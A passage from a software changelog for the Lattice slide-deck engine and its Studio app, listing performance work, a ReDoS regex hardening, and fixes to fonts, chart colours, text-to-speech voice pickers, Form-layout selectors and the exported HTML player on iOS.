  the full KaTeX library even for decks with zero math. It's now split into
  its own on-demand bundle (`lattice-katex.js`, `tools/build-katex-provider.js`),
  loaded only when a source pre-scan (`lib/engine/math-detect.mjs`'s
  `sourceHasMath`, itself KaTeX-free) finds `$…$`/`$$…$$` syntax — through the
  ONE choke point the prior entry set up
  (`docs/src/lib/render-engine.ts`'s `renderMarkdown()`), so none of the 7
  migrated call sites changed again. `tools/build-playground.js` aliases
  math.js's `katex` import to a small browser-only stub
  (`lib/engine/katex-browser-stub.js`) for this build ONLY — `math.js`'s CODE
  is untouched (only a cross-referencing comment added, pointing at
  `math-detect.mjs`) and its Node/CLI behavior (`lattice-emulator.js`, the npm
  package, every existing math test) is unchanged, since esbuild never runs
  there. Measured locally
  (same-machine, gzip): `lattice-playground.js` 578,981 → 501,495 bytes
  (−77,486 bytes, −13.4%); the new `lattice-katex.js` is 76,722 bytes gzip,
  fetched lazily. The Drawing Board (frozen —
  `engineering/decisions/2026-07-03-studio-succession.md`) keeps loading
  KaTeX eagerly, unconditionally, from its page shell — a mechanical
  compatibility addition (not new Drawing Board feature work) so this
  engine-level change can't regress a surface CLAUDE.md's freeze otherwise
  protects from ordinary fixes. See
  `engineering/decisions/2026-07-10-landing-perf-katex-defer.md` §4.

### Fixed

- **Charts rendered solid black (pie, choropleth map) or lost their colour
  (gantt bars, journey chips) on old smart-TV / webOS browsers.** Every chart
  colour resolves through the CSS `light-dark()` / `color-mix()` functions
  (`light-dark()` shipped in Chromium 123, Mar 2024); on an engine that predates
  them the whole declaration is invalid at computed-value time and is dropped —
  an SVG `fill` then falls to its black initial value and an HTML `background`
  vanishes. The build now emits, per theme, a flat-literal fallback inside
  `@supports not (color: light-dark(#000,#fff))` — a block a modern engine
  evaluates to false and never applies (modern render is byte-identical), and an
  old engine applies, so every chart gets a parseable, on-brand colour with no
  JavaScript and no first-paint flash. Dark mode still works: the default branch
  carries the theme's declared canvas (a `-dark` theme → dark), and the per-slide
  `section.dark` / `section.light` modifiers flip it — the same `color-scheme`
  mechanism the live render uses (not OS preference). Themes are untouched; the
  fallback is
  generated by reading the authored chart CSS and resolving it against each
  theme's tokens (`tools/build-chart-compat-css.js`), so it can't drift (a
  browser-parity test pins each literal to Chromium's computed value). The one
  concession is the map's continuous choropleth ramp, which degrades to a single
  representative on-brand tone on old engines (value-gradation is lost, hue and
  canvas are correct). ~16 KB gzipped per theme; the real device (LG C4) is
  **unverified** from CI — the fallback is proven correct by resolver↔browser
  parity, not yet eyeballed on the TV.
- **Two engine text-transform regexes were hardened against the nested-quantifier
  ReDoS shape a static analyzer (CodeQL) flags — and one of them was a REAL,
  reachable hang, not just a flagged shape.** (1) The trailing `<code>` chip-run
  splitter (`lib/core/slot-label-lift.js`) had a lazy inner `[\s\S]*?` under a `+`
  that backtracked **exponentially**: a slot label with a few dozen inline-code
  chips (markdown-it emits a `<code>` per `` `span` ``) plus trailing prose took
  ~9s at 28 chips and doubled with each added chip — a live render hang. Unrolling
  the inner to the disjoint-alternatives `(?:[^<]|<(?!\/code>))*` delimits each chip
  unambiguously; it is now linear (2.4ms at 500 chips) and behaviorally identical on
  every markdown-it-reachable input. (2) The `![bg …]` background-directive matcher
  (`lib/core/bg-image.js`) is rewritten from the nested `(?:\s+\w+)*` to an optional
  single-star `(?:[^\S\r\n](?:[^\S\r\n]|\w)*)?` — provably linear, and scoped to
  **horizontal** whitespace (`[^\S\r\n]` = whitespace except CR/LF) so a broken
  multi-line `![bg` can no longer swallow the following prose up to a later `](url)`
  (a latent over-run the old `\s`-based form had), while still accepting nbsp /
  Unicode spaces so a directive pasted from Word/Docs keeps rendering (a true
  superset of the old run); it also now tolerates a trailing space before `]`. New
  edge-case tests pin the equivalence and the two fixes (multi-chip runs,
  escaped-entity and literal-`<` chip bodies, nbsp-separated directives, a
  discriminating cross-newline no-over-run case, trailing-space tolerance, long-input
  guards). The other two grep-hits the audit surfaced (`journey.transform.js`,
  `compare-code.transform.js`) carry only a benign, single, non-repeated
  `<code>…</code>` match — no repeated-group/anchor shape — and are linear as-is, so
  they are left unchanged. Closes #901.
- **A false "Overflows" ring could appear on the exported `.html` sidecar
  for a slide that actually fits, and never clear.** Marp's template
  lazy-loads a `@font-face` only when the browser first tries to paint text
  using it, so `document.fonts.ready` can resolve "loaded" for the page
  overall before a specific slide's own text has actually triggered its
  font's fetch. The exported `.html`'s embedded overflow-watcher script
  measured on `DOMContentLoaded` with no font-forcing step, so a borderline
  slide could get measured against wider/taller fallback-font metrics and
  cross the tolerance — a false positive with no way to self-correct (the
  script only re-checks on window resize). The PDF/PPTX export itself was
  never affected — a separate measurement pass already force-loads fonts
  first. Fixed by making both the exported sidecar's script and the
  live-preview runtime force every declared font to load and settle before
  their first measurement, via a new shared, unit-tested
  `lib/core/font-settle.js` helper (bounded by a timeout, so a hung font
  fetch can't suppress the ring forever either). Closes #894 (which had
  originally misdiagnosed this as the opposite: an undercount in the
  console warning, rather than an overcount in the sidecar's own ring). See
  `engineering/decisions/2026-07-10-overflow-cause-highlighting.md` §14-15.
- **Previewing an unselected model row in the Studio's cloud TTS picker no
  longer silently plays the CURRENTLY ACTIVE model instead of the row you
  clicked.** Clicking ▶ next to a model you hadn't picked yet correctly used
  that row's id for the cache lookup, but the live fallback (`voice-model.js`'s
  `previewVoice`) ignored it entirely and always synthesized through whatever
  model was already active — a real, pre-existing bug flagged (but out of
  scope) by the independent checker during the Speed-slider redesign's
  pre-merge review. `openRouterRung.synth` now accepts a per-call `model`
  override, used for both the live request and the cache key so a row preview
  can't collide with another model's cache entry either; the main "Play
  sample" button, which always already passes its own active model
  explicitly, is unaffected. See
  `engineering/decisions/2026-07-09-studio-cloud-ondevice-config-split.md`'s
  model-row-preview follow-up.
- **The Fix-Me overlay's Case B (density-budget fallback, shipped hours
  earlier the same day) undercounted words and could misfire on `kanban`.**
  A post-merge adversarial review (red team + Munger inversion + an
  independent checker) found two live bugs before either shipped in a
  release: (1) the word counter read one flat `.textContent` string, which
  silently glues adjacent elements' text together when a component's markup
  has no whitespace between sibling tags (`kanban`/`timeline-list` both
  build markup this way) — a genuine over-budget item could go unflagged.
  Fixed by tokenizing each DOM text node independently instead of splitting
  one joined string. (2) `kanban`'s card text is fully CSS-truncated
  (2-line clamp on titles, single-line ellipsis on bodies), so its word
  count can never be the true cause of an overflow — Case B could still tag
  some card's already-invisible text as "Likely fix." Fixed by excluding
  `kanban` from the density-budget signal specifically, leaving its
  existing Case A drill-down untouched. See
  `engineering/decisions/2026-07-10-overflow-cause-highlighting.md` §13.
- **The Studio's TTS Speed slider no longer pretends to work on voices that
  ignore it — and Gemini's cloud voice no longer 400s on every real playback.**
  Live-tested all 9 of OpenRouter's TTS models with real audio (before/after
  duration measurements, not documentation): only Kokoro, MAI-Voice-2, and both
  Zonos variants actually respond to the `speed` request param — Grok, Gemini,
  Orpheus, CSM, and Voxtral silently ignore it regardless of value. The Speed
  section now renders a real slider only for a model verified to honor it; for
  the rest it shows a plain "doesn't support adjustable speed" note in place of
  a slider that would look broken (drag it, hit Play, nothing changes). Separately,
  Gemini's speech endpoint 400s on `response_format:"mp3"` and only returns raw
  PCM — the pre-generated sample script already knew this, but the LIVE playback/
  narration path (`voice-model.js`) didn't, so every real use of the Gemini voice
  failed outright. It now requests `pcm` for that one model and wraps the response
  in a WAV container, mirroring the generator script. A pre-merge adversarial
  review caught one more leak this fix would otherwise have made worse: `speed`
  is a single cross-model preference that's never reset when the active voice
  model changes, and "Play sample" only serves its free, committed local sample
  at the default speed — so a non-default speed picked on one (speed-supporting)
  model silently forced a live, billed call for every later preview on a
  DIFFERENT model that can't use speed at all, with the removed slider no longer
  even hinting why. `previewTtsVoice` now clamps to the default speed for a
  model that doesn't support it. See
  `engineering/decisions/2026-07-09-studio-cloud-ondevice-config-split.md`'s
  speedSupport follow-up (and its round-2 adversarial-trio section).
- **The Studio/Workbench/Playground live preview's fonts no longer 404.**
  `lattice.css`'s `@font-face` block ships a package-relative
  `url(fonts/<file>.woff2)` — correct for the npm package, where
  `dist/fonts/` sits next to `dist/lattice.css` (`lib/fonts/text-faces.js`).
  The docs site never links that CSS as a real stylesheet resource though:
  every consumer hands the fetched text to `PG.addThemes`, which the engine
  embeds as an inline `<style>` wherever it renders — a `srcdoc` iframe with
  no base URL of its own for single-slide hosts, the multi-slide filmstrip
  elsewhere — so the relative `url()` resolved against whichever PAGE
  happened to embed it (`/studio/fonts/…`, `/workbench/fonts/…`,
  `/playground/fonts/…`) instead of where the fonts actually live, 404ing
  the same way on all three app surfaces. `lattice.css` also bakes in
  KaTeX's own `@font-face` block unconditionally, with the identical
  footgun. `docs/scripts/sync-playground-assets.mjs` now stages the same 17
  text faces (`lib/fonts/text-faces.js`'s canonical manifest) under
  `themes/fonts/`, co-located with `themes/lattice.css` exactly like the
  existing KaTeX-fonts staging pattern; `docs/src/lib/theme-fetch.ts`
  rewrites each relative `url(fonts/…)` to an absolute URL (routing
  `KaTeX_*` refs to the sibling `katex/fonts/` dir already staged for
  `katex.min.css`, everything else to the new `themes/fonts/`) before the
  CSS text goes anywhere, so it survives being inlined into any context.
  Verified in a real browser: zero 404s across Studio/Workbench/Playground,
  and every declared face (the 17 text faces plus KaTeX's) force-loads
  without error on a math specimen page. Closes #876.
- **The legal component gallery no longer claims a "three-renderer parity"
  that hasn't existed since the P4 Marp-CLI retirement.** The closing "What
  this deck delivers" slide's bullet named `marp-cli` as one of three
  renderers processing the shared transforms — it never was one; the real
  two kernel consumers are the owned engine (serving both the CLI/PDF path
  and the browser playground) and the runtime. Last item in the Marp-legacy
  audit's §6 backlog. Both light/dark gallery PDFs rebuilt.
- **`dist/README.md`'s artifact descriptions no longer frame `lattice-emulator.js`
  as a "Marp-faithful renderer."** It's Lattice's own engine (no Marp involved);
  the stale phrasing predates the Marp-independence work. `lattice-runtime.js`'s
  entry now also names the Export-to-Marp bundle's full-fidelity HTML route
  (it already ships there) alongside the marp-vscode preview and web export.
  Also filled in the missing `lattice-emoji.css` row (was a `TODO` placeholder).
  See `tools/build-dist-readme.js`.
- **The Playground's live preview rendered faster on first load.** Same class
  of bug as the landing page's Hero preview fix below, in a different render
  pathway: `docs/src/lib/playground-engine.ts`'s `renderInto()` only starts
  the theme CSS fetch once the engine bundle is already loaded (it needs
  `window.LatticePlayground` to register a theme), and the render loop
  handled "not ready yet" with a 60ms polling retry rather than a promise
  chain — so the theme fetch never started until the engine bundle already
  had, the same serialization, just implemented differently. Added a
  `prefetchTheme()` to the engine bridge (fires the theme CSS fetch using the
  site's current palette as a best-effort guess, independent of the engine)
  and call it alongside the existing idle-triggered `ensure()`. Verified in a
  real browser: the theme CSS and engine-bundle requests now fire at the
  same timestamp instead of sequentially.
- **The landing page's live Hero preview rendered noticeably faster.** Two
  sequential network round-trips were serialized where they didn't need to
  be: `docs/src/lib/prefetch-engine.ts`'s eager engine-bundle warm queued its
  `rel=prefetch` injection behind `requestIdleCallback` (up to a 3s timeout,
  or a 1200ms fallback) instead of firing immediately, so it rarely won a
  head start against the real engine-bundle request it was meant to warm;
  and `docs/src/components/DeckPreview.tsx`'s paint step waited for the
  554KB engine bundle to fully load before even starting the theme CSS
  fetch. The prefetch now fires immediately (`rel=prefetch` is already a
  low-priority hint, so no LCP risk), and a new `prefetchTheme()` on the
  single-slide renderer (`docs/src/lib/single-slide-render.ts`) kicks the
  theme fetch off in parallel with the engine load instead of behind it.
  Measured on the production build via real `iframe.onload` timing: Hero
  preview content-loaded time dropped from ~1.2-1.4s to ~0.9s.
- **The Workspace "Play sample" button could get stuck on "Playing…" forever.**
  `previewVoice()`'s playback phase had an 8s watchdog, but the SYNTH phase (the
  network fetch to OpenRouter, or the Kokoro worker round-trip) had none — a hung
  request left the button frozen with no way out short of closing the panel.
  Both `previewVoice()` and `speak()`'s narration path now bound the synth phase
  to 20s. See `engineering/decisions/2026-07-09-studio-cloud-ondevice-config-split.md`.
- **The Studio read-along no longer races its own highlight.** `useReadAloud`'s
  frame loop started synchronously, in text-estimate mode, before the async voice
  model resolved — so a clocked voice (OpenRouter/Kokoro) attaching after some real
  wall-clock delay reset the word cursor back to the first word, a visible
  race-then-rewind. The loop's first tick is now deferred until the mode is
  actually known. See `engineering/decisions/2026-07-09-cadenza-narration-quality.md`.
- **Read-aloud narration no longer runs bullets together with no breath.**
  `slideToSpeech` flattened headings/list items with no terminator, so Cadenza's
  existing punctuation-driven pause never fired between them. Structural lines
  (headings, list items, blockquotes) now get a terminator if missing; plain
  paragraph continuations are untouched. Same decision doc.
- **Below-note (the trailing editorial hairline note) renders again under Form
  default.** `lib/transformers/registry.js` runs `masthead-lift` before
  `below-note`, so on any Form slide whose layout wraps its body into
  `.cell-stage` (cards-grid, list, kpi, decision, and ~25 more), below-note's
  end-of-content detection no longer saw the trailing `<p>` — the note rendered
  as a bare, unstyled paragraph instead of getting the `.below-note` hairline
  treatment. `lib/core/below-note.js` now looks inside a slide's `.cell-stage`
  cell (when masthead-lift has wrapped one) instead of assuming the trailing
  `<p>` sits as a direct section child; unaffected (no-Form, or a
  STAGE_DEFERRED layout) slides are untouched. Also scoped the runtime's DOM
  walk to top-level sections (`section:not(section section)`), matching the
  HTML path's depth-aware walk, so a literal nested `<section>` an author
  writes in slide content is no longer double-processed; and added `math` to
  the exclusion list (it drives its own concluding-equation-paragraph styling
  and has no local `.below-note` treatment). The `.cell-stage` detection is
  now a depth-aware scan for a genuine top-level element, not a bare
  substring search — a `<pre>`/code sample or hand-authored HTML that merely
  mentions the literal text `<div class="cell-stage">` could otherwise be
  mistaken for the real masthead-lift stage, silently leaving a section's
  true trailing note unwrapped or hijacking extraction onto the wrong
  paragraph. See `engineering/decisions/2026-07-09-form-migration-audit.md`.
- **A trailing Subtitle no longer gets misidentified as a leading Eyebrow
  under Form.** masthead-lift's eyebrow extraction (`lib/forms/cell/masthead/
  masthead.transform.js`, `lib/transformers/masthead-lift.js`) had no
  positional check against the title — it captured the first code-only
  paragraph anywhere in a Form slide's body, so a code-only paragraph authored
  AFTER the heading (the documented Subtitle pattern, `lib/base/base.docs.md`)
  was reordered BEFORE it and mis-styled as the mono-caps eyebrow kicker
  instead of the italic subtitle. Eyebrow capture is now scoped to only the
  content preceding the title; a code-only paragraph immediately following it
  is captured separately as the subtitle and re-seated next to the `<h2>`
  inside the masthead band, preserving the `h2 + p` sibling adjacency its CSS
  keys on. The eyebrow scan is also now depth-aware — a code-only paragraph
  nested inside a `<div>`/`<li>` before the title is real content, not the
  eyebrow, and is no longer hoisted out of its container. Found by the
  Form-migration audit
  (`engineering/decisions/2026-07-09-form-migration-audit.md`).
- **The runtime's deck-wide `meta:`/`logo:`/`class:` (+finish/mode/claim/
  stamp/tone/spectrum) front-matter registers no longer go silently missing
  after a live edit.** Each was a one-shot fetch-and-apply fired once at
  bootstrap, unlike the progress/watermark Tiles (which #837 explicitly moved
  into the recurring transform pass so they re-fire on every preview edit).
  Marp's live preview replaces an edited slide's `<section>` wholesale, which
  rebuilds a fresh, empty masthead-bay / logo-less / backdrop-less section —
  and since these three never re-fired, previously-shown chrome was
  permanently lost for the rest of the session, even though the underlying
  fetch had already succeeded once. Each now caches its parsed front-matter
  config after the first successful fetch and re-applies it (idempotently)
  on every later transform pass, with no re-fetch. Found by the
  Form-migration audit
  (`engineering/decisions/2026-07-09-form-migration-audit.md`), which also
  added a permanent regression guard: a test loading the real bundled
  `dist/lattice-runtime.js` into jsdom, stubbing `fetch`, and simulating a
  live-edit DOM replacement to assert logo/meta/class persist without a
  second fetch (`test/integration/parity/runtime-frontmatter-refire.test.js`).
- **Accessibility-theme (`theme: a11y-*`) chart/diagram fills resolve in the
  live preview.** `lib/core/accessibility-textures.js`'s categorical CVD
  texture pattern `<defs>` — the redundant non-colour encoding a11y themes
  rely on — was injected into every export (`lattice-emulator.js`) but never
  into the browser runtime, despite the module's own header comment saying
  "the runtime follows." Chart/Mermaid fills under an a11y-* theme reference
  `fill: url(#latt-a11y-tex-N)`; with no matching `<pattern>` in the
  live-preview document, that paint-server reference silently resolved to
  nothing. The runtime now injects the same defs once at boot. Found by the
  Form-migration audit (`engineering/decisions/2026-07-09-form-migration-audit.md`).
- **A literal nested `<section class="form">` an author writes inside slide
  content no longer gets processed twice on the live-preview path.**
  masthead-lift's DOM selector (`section.form`) had no depth guard — unlike
  `lib/forms/form-default.js`'s `section:not(section section)` — so it lifted
  a hand-authored nested Form section independently, a divergence from the
  HTML-string kernel (which only ever touches top-level sections via its
  depth-aware `mapSections` walk). Now scoped to `section.form:not(section
  section)`, matching the HTML path exactly. Found by the Form-migration
  audit (`engineering/decisions/2026-07-09-form-migration-audit.md`).
- **Key Insight, the raw-form Annotation footnote, and the Universal Heat
  Overlay render again under Form default.** `lib/forms/cell/masthead/
  masthead.transform.js` wraps a Form slide's flow body into `<div
  class="cell-stage">` for every `STAGE_MIGRATED` layout (cards-grid, list,
  kpi, checklist, and ~25 more — the common case, since Form has been default
  since 2026-06-26), but `lib/base/base.modifiers.css`'s Key Insight blockquote
  panel, the Marp-preview raw-form Annotation selectors, and the Universal
  Heat Overlay's `ul`/`ol` state-color inversion all used a direct-child-of-
  `<section>` selector — so all three silently stopped matching once the body
  moved one level deeper. Each now carries a `.cell-stage`-aware companion
  selector (the same pattern already shipped for the Universal Pill rule),
  duplicated as literal comma-separated selectors rather than a collapsed
  `:is(section, .cell-stage)` — Marpit's CSS scoper rewrites a leading
  `:is(…)` into a descendant of the slide root, breaking that shortcut under
  real Marp-preview rendering. `redline` and `inventory` are excluded from the
  new Key Insight arm — both already ship their own dedicated `.cell-stage`-
  scoped blockquote treatment. Found by the Form-migration audit
  (`engineering/decisions/2026-07-09-form-migration-audit.md`).
- **The `sketch` finish's hand-drawn card boxes render again under Form
  default, across ~14 layouts.** `lib/forms/cell/masthead/masthead.
  transform.js` wraps a Form slide's flow body into `<div class="cell-stage">`
  for every `STAGE_MIGRATED` layout, but `lib/base/base.sketch.css`'s
  hand-drawn box treatment — the asymmetric border-radius, offset ink shadow,
  and per-card micro-rotation that are `mode: sketch`'s headline visual
  feature — used only direct-child-of-`<section>` selectors across
  cards-grid, cards-stack, verdict-grid, decision, matrix-2x2, pricing,
  compare-prose, citation-card, list-tabular, list, redline, checklist,
  actors, and agenda (all five agenda styles). Once the body moved one level
  deeper, every one of those selectors silently stopped matching and the
  cards fell back to their plain component border — Form is default since
  2026-06-26, so this was the common case, not an edge case. Each affected
  selector now carries a `.cell-stage`-aware companion (same pattern as the
  Universal Pill rule and the Key Insight/Annotation/Heat-Overlay fix above).
  Found by the Form-migration audit
  (`engineering/decisions/2026-07-09-form-migration-audit.md`).
- **`_focus: item N` and `_build: item` work again in the live preview under
  Form default.** `lib/transformers/focus.js` and `lib/transformers/build.js`'s
  DOM 'item' axis scoped its list lookup to `:scope > ul, :scope > ol` —
  masthead-lift wraps a Form slide's body into `.cell-stage` for every
  `STAGE_MIGRATED` layout (the common case, since Form has been default since
  2026-06-26), moving the list one level deeper than that selector reached,
  so the axis silently found nothing and no `lat-focus`/`lat-recede` classes
  or `data-build-step` attributes were ever stamped in the runtime/DOM path
  (the HTML/export path was unaffected — its string scan is depth-agnostic).
  Both now also check `:scope > .cell-stage > ul, :scope > .cell-stage > ol`.
  Found by the Form-migration audit
  (`engineering/decisions/2026-07-09-form-migration-audit.md`).

- **The browser runtime now composes decks as Form by default, matching the
  engine.** `dist/lattice-runtime.js` never stamped the `form` class the engine
  adds at render time, so a deck built from `lattice.css` + the runtime + a theme
  and rendered through Marp (the marp-vscode preview, or an export-to-Marp
  bundle's HTML opened in a browser) came out Form-**blind** — no masthead band,
  bay, footer cell, progress rail, or watermark, since that whole chrome layer
  keys on `section.form`. The runtime now reproduces the render-time default on
  the live DOM via a shared kernel (`lib/forms/form-default.js`) that reuses the
  engine's `formToggleClass`, so the sovereign-frame skip set and the
  `form` / `no-form` opt-outs stay single-sourced across all three render paths.
  It also stamps `data-lattice-slide` (which the Tiles + overflow probe scope on;
  Marp omits it). The runtime reads no front matter, so the deck-wide `form: off`
  opt-out remains a render-time (engine / CLI) key. See
  `engineering/decisions/2026-07-08-runtime-form-default.md`.
- **Deleting a deck from the switcher now also clears its checkpoints, chat
  history, and chat draft.** `deleteDeck` (`studio-store.ts`) dropped only the
  index entry, edited source, and comments — the checkpoint/chat/chat-draft
  keys for that deck's id were left orphaned in localStorage forever. Found
  during an adversarial review of the new Privacy & Data tab: its "Delete
  everything" only sweeps ids still in the current deck index, so any deck
  deleted before this fix would survive even a full wipe. `clearAllDecks` now
  also sweeps by key prefix (not just index membership) to catch anything
  already orphaned from before this fix shipped.
- **The two-tap delete "Sure?" state (Library cards + the Privacy & Data tab)
  no longer lingers forever.** `DeleteBtn` (`Library.tsx`, shared by both
  surfaces) previously stayed armed until the surrounding sheet closed — click
  away, switch tabs, get distracted, and a single later click on what you
  thought was the plain Delete button fired a real delete instead. It now
  un-arms itself after ~3s of inactivity (matching the existing slide-toolbar
  delete pattern in `StudioShell`'s `RailOp`) or on a pointerdown anywhere
  outside the button, whichever comes first — captured at the document level
  so another component's `stopPropagation` can't swallow it.
- **Every component-reference page (56 of them) no longer force-loads the
  full ~554KB-gz engine bundle eagerly.** `Specimen.astro` still carried the
  unconditional `<script defer src=…>` tag `docs/src/lib/load-engine.ts` was
  built to eliminate everywhere else (landing, playground, workbench,
  drawing-board, studio) — it computed `engineUrl` but never wired it into
  the on-demand `ensureEngine()` loader. `engineUrl` is now threaded through
  `Specimen.astro` → `specimen.js`, which uses the same on-demand path as
  every other app surface.
- **The landing page's "speaks your field" cards and the palette-cycling
  showcase render faster on a fast scroll or cold visit.** Same class of bug
  as the Hero preview fix above, not yet applied to these two: both
  `FieldCardsLive.tsx` and `RestyleShowcase.tsx` called
  `createSingleSlideRenderer()` directly and waited for the engine bundle to
  load before starting their theme CSS fetch. Both now call the renderer's
  `prefetchTheme()` in parallel with `whenReady()`, matching
  `DeckPreview.tsx`'s already-shipped fix.
- **The Studio's Coach/Architect panel no longer re-runs a full deck-wide
  lint pass on every keystroke.** The `useEffect` that recomputes `findings`
  was undebounced, duplicating the same deterministic scan CodeMirror's own
  (750ms-debounced) inline linter already performs. Debounced to 400ms,
  matching the file's existing autosave debounce.
- **The Slide settings panel no longer re-parses the deck's front matter
  from scratch on every keystroke while open.** Six provenance lookups
  (canvas/finish/spectrum/stamp-style/tone-style/deck-defaults) in
  `SlideContext.tsx` ran unmemoized in the render body; each wrapped in
  `React.useMemo` keyed on the inputs that actually change them.
- **The live-preview runtime does less redundant work per edit.** Three
  separate `MutationObserver`s on `document.body` (content/Mermaid
  transforms, section geometry, and the overflow watcher) each reacted
  independently to the same DOM mutations, two of them re-scanning every
  slide in the deck on every keystroke with no shared coalescing. The
  geometry and overflow watchers now share one `MutationObserver` + one
  `requestAnimationFrame` dispatch (content/Mermaid's own 150ms-debounced
  observer is unchanged — it wants a different settle window). Verified in a
  real browser: unchanged detection behavior (overflow class/tab, the
  `--_sec-1cqi` geometry variable), observer count on `document.body` down
  from 4 to 3.
- **Several render-path string scanners sped up ~4-16x with byte-identical
  output**, found by a red-team/inversion/independent-checker performance
  audit (`engineering/decisions/2026-07-10-landing-perf-katex-defer.md`):
  the shared `<section>` walker (`lib/core/section-walk.js`'s
  `mapSections()`, used by masthead-lift, split-panels, chart-family, and
  compare-code) stepped one character at a time to find each section's
  close tag instead of jumping via `indexOf`; `compare-code.transform.js`
  carried its own private, now-deduplicated copy of that same scan;
  `journey.transform.js`'s list-walker was a byte-for-byte duplicate of
  `_chart-family/transform-utils.js`'s (already shared by radar/quadrant),
  now deduplicated too; and `chart-family.js`'s roadmap-figure/chart-body
  `<div>` depth scans were extracted into one shared, indexOf-jumping
  `lib/core/find-matching-close.js` helper. Every change verified
  byte-identical against the pre-change output on real decks before
  landing.
- **The exported `.html` player now displays correctly on iOS.** Four fixes,
  diagnosed on a real iPhone where the player showed only a blank/broken page,
  then a working-but-visually-broken one: (1) **CSP hash on WebKit** — the single
  inline script is pinned by a sha256 CSP, and WebKit hashes non-ASCII bytes
  differently than Chromium/Node, so the script's dark-toggle glyphs and
  em-dashes made the hash disagree and WebKit refused the script. Every
  non-ASCII code point in the hashed script is now escaped to `\uXXXX`
  (runtime-identical; CSP kept). (2) **Content rode high / the title slide
  rendered tiny** — the present + read views forced `display:block` on each
  `<section>`, overriding the engine's base `display:flex;flex-direction:column`
  and making `section.title{justify-content:center}` inert, so cover content
  flowed to the top instead of centering. The views now keep the section flex.
  (3) **Read·Slides + the no-JS floor illegibly tiny text** — scaling with CSS
  `zoom` (to collapse the layout footprint) reintroduced a documented, previously
  REJECTED bug: iOS WebKit does not re-resolve `container-type:size` + cqi/cqh
  (the engine's whole typography/spacing scale) against a zoom-scaled container,
  so cqi collapses to near-zero — invisible to every headless CI gate, which
  Chromium doesn't reproduce. Each slide is now wrapped in a `.lp-frame` sized to
  the scaled footprint (so the column still packs tight) and the slide inside
  scales with `transform` (immune — cqi resolves once against its own intrinsic
  1280×720 box). (4) **Present not vertically centered / asymmetric top-bottom
  padding** — three compounding issues: a third-party iOS viewer's own in-app
  chrome can report a `dvh` that doesn't match what's actually visible (the
  stage height now prefers a JS-measured `visualViewport`/`innerHeight` value,
  falling back to `dvh` only pre-JS); the fit scale was computed against
  `innerWidth`/`innerHeight` with a hand-tuned inset baking in the top bar's
  height, a different number than the `#lp-stage` element's own CSS height —
  the two could drift apart (fit now measures the stage element's own
  `clientWidth`/`clientHeight` directly, so the scale and the centering box are
  always the same measured box); and a base `padding-top:48px` rule (meant for
  the scrolling Read·Slides/Article views) also applied in Present, where the
  stage is already `position:fixed;top:48px` — double-counting the bar and
  eating into the centered content box asymmetrically (Present now resets it to
  `padding-top:0`). Confirmed symmetric (0px top/bottom diff) at three viewport
  sizes. A progressive-enhancement `.lp-js` gate keeps a readable stacked-slide
  floor when the script is ever blocked. Confirmed on-device.
- **The exported `.html` player's toolbar got a mobile-UX + icon-consistency
  pass.** Several gaps found across two rounds of on-device vetting: (1)
  Present had no on-screen way to advance — only keyboard arrows and swipe,
  and some third-party iOS HTML viewers don't reliably deliver keydown to the
  page. Circular chevron buttons (mirroring the Studio's audio-present
  overlay) now flank the slide, wired to the SAME shared transport
  keyboard/swipe already use (`t.prev()`/`t.next()`, not a hand-rolled clamp),
  and disable at the deck's first/last slide. (2) The Present / Read·Slides /
  Read·Article tab labels wrapped to two lines on a real iPhone, blowing out
  the top bar's height — fixed by compacting the bar at narrow widths (smaller
  font/icon/padding) rather than hiding the text, so every tab always carries
  BOTH an icon and its label, never icon-only. (3) The speaker-notes,
  fullscreen, and dark/light buttons carried literal emoji glyphs (☰/⛶/☾/☀)
  instead of the SVG icon language the rest of the bar uses; the dark/light
  glyph's swap also changed the character's intrinsic width, visibly shifting
  the button's size on every toggle. All three are now SVG, and dark/light
  swaps a fixed-size icon so the button never resizes. (4) Fullscreen is now
  feature-detected and the button hides itself when the API is unavailable
  (historically true for arbitrary elements on iOS/iPadOS Safari) instead of
  silently no-oping forever. (5) Read·Slides' stage padding undercut the fixed
  bar's height (a higher-specificity shorthand silently replaced the base
  bar-clearance rule instead of adding to it), leaving the first slide's top
  ~20px under the bar's translucent band — padding now explicitly clears the
  full bar height plus breathing room. (6) The dark/light toggle needed TWO
  taps to actually switch on a system-dark device: it read the button's own
  inline `color-scheme` (which starts empty) to decide "is it dark right
  now," but the deck was already rendering dark via the base
  `:root{color-scheme:light dark}` following the OS preference — so the icon
  started wrong (moon, "tap for dark," when already dark) and the first tap
  just reasserted dark (invisible). The toggle now seeds its state from the
  actual system preference (`matchMedia`) at load, so the icon and the first
  tap are correct from the start.
- **The Studio “Download as webpage” export now renders and runs — not just
  assembles.** Two bugs made the browser-exported player ship broken on every
  browser (the file downloaded fine but opened to raw, unstyled slides that
  couldn't be navigated), both invisible to the unit tier because nothing opened
  the real artifact: (1) the browser engine scopes every deck rule to its
  live-preview wrapper (`div.lattice > section …`), but the export lays sections
  out flat like the CLI — so the file carried the full CSS yet **none of it
  applied**. The export now un-scopes the deck CSS to the CLI's shape. (2) the docs
  production build **minifies** `player-core`, renaming the transport-kernel
  functions (`createTransport`→`Q`, …), so the `.toString()`-inlined script threw
  `createTransport is not defined`, stripped `.lp-js`, and fell to the no-JS floor.
  The kernel is now inlined bound to **stable `var` names** (minifier-independent),
  and the keymap is passed explicitly so no renamed free reference is evaluated. A
  new Playwright e2e (`docs/e2e/webpage-export.spec.ts`) drives the real Share →
  Webpage flow and asserts the downloaded player boots (styled + script runs), so
  this can't regress unseen.

### Added

- **The Workspace read-aloud voice picker covers every model OpenRouter's speech
  catalog actually lists, sourced live — never a hand-typed guess, never free
  text.** Voice rosters are now read straight from OpenRouter's own
  `supported_voices` field (the same catalog call that already lists TTS models),
  not scraped from vendor documentation — the earlier hand-curated roster had
  included a voice (`zoe`, Orpheus) that consistently errors on the live
  endpoint; a live-sourced list can't make that mistake. This also corrected two
  wrong assumptions: Zyphra's Zonos and Sesame's CSM-1B were believed to have no
  named-voice concept at all (pure voice-cloning, per their own docs) but
  OpenRouter's hosted integration exposes real, working presets for both
  (`american_female`/`british_male`, `conversational_a`/`read_speech_a`, etc.),
  live-verified. Every model with a published roster — currently all 9 — gets a
  real dropdown; a model with none gets a disabled, explained field, never an
  editable text box (nobody should have to type an opaque voice id blind). The
  one hand-maintained exception is Microsoft's MAI-Voice-2, whose OpenRouter
  listing samples only 4 of its real 44 voices — supplemented with the
  documented, live-verified English subset. Picking any voice — from the
  dropdown, or a model row's inline preview — always plays a sample.
- **The cloud TTS model picker is now the same rich search + Featured/Value/
  Free/All picker as the chat-model picker**, with an inline ▶ Play button per
